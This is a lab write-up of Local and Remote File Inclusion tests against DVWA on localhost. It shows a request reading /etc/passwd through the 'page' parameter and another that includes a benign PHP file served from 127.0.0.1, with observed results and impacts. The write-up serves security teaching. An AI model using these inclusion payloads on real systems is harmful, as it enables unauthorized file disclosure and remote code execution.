# File Inclusion Testing

## Objective

Demonstrate Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities in DVWA using a controlled localhost environment.

## Environment

- Application: Damn Vulnerable Web Application (DVWA)
- Testing Environment: Localhost
- Security Level: Low
- Web Server: Apache
- PHP: PHP 8.4
- Testing Tool: Web Browser

---

# 1. Local File Inclusion (LFI)

## Description

Local File Inclusion occurs when an application uses user-controlled input to determine which local file should be included or displayed without sufficient validation.

An attacker may abuse this functionality to access files available on the local system.

## Vulnerable Parameter

The DVWA File Inclusion functionality accepts a file through the `page` parameter.

The vulnerable implementation uses user-controlled input in the file inclusion operation.

## Attack Scenario

The following local file was requested:

```text
/etc/passwd

The request used:

http://localhost/dvwa/vulnerabilities/fi/?page=/etc/passwd
Observed Result

The contents of /etc/passwd were successfully displayed through the DVWA File Inclusion page.

This confirmed that arbitrary local file paths could be supplied to the vulnerable functionality.

Security Impact

Successful LFI may allow an attacker to read sensitive files accessible to the web server process.

Potential impacts include:

Disclosure of system configuration information
Exposure of application configuration files
Disclosure of sensitive credentials or secrets stored in readable files
Information gathering about the underlying operating system
2. Remote File Inclusion (RFI)
Description

Remote File Inclusion occurs when an application allows a remotely hosted file to be included through user-controlled input.

When remote inclusion is enabled and the included file contains executable server-side code, the remote code may be executed by the server.

Test Setup

For this controlled laboratory demonstration, a harmless PHP file was created and hosted locally using a Python HTTP server.

The test file contained:

<?php
echo "<h3>RFI_SUCCESS: Remote PHP file was included and executed.</h3>";
?>

The file was served from:

http://127.0.0.1:8000/rfi-test.php
Attack Scenario

The DVWA File Inclusion functionality was supplied with the remote file URL:

http://localhost/dvwa/vulnerabilities/fi/?page=http://127.0.0.1:8000/rfi-test.php
Observed Result

The DVWA page displayed:

RFI_SUCCESS: Remote PHP file was included and executed.

This confirmed that the remote PHP file was successfully included and its server-side PHP code was executed.

Security Impact

RFI can have severe consequences because an attacker-controlled remote file may be executed by the vulnerable server.

Potential impacts include:

Remote code execution
Unauthorized modification of application behavior
Exposure or manipulation of application data
Compromise of the web application environment

Conclusion

The File Inclusion testing demonstrated both LFI and RFI in the controlled DVWA environment.

The LFI test showed that a local system file could be accessed through user-controlled input. The RFI test demonstrated that a remotely hosted PHP file could be included and executed when remote inclusion was enabled.

These results demonstrate the security risks of using unvalidated file paths and remote resources in server-side file inclusion functionality.
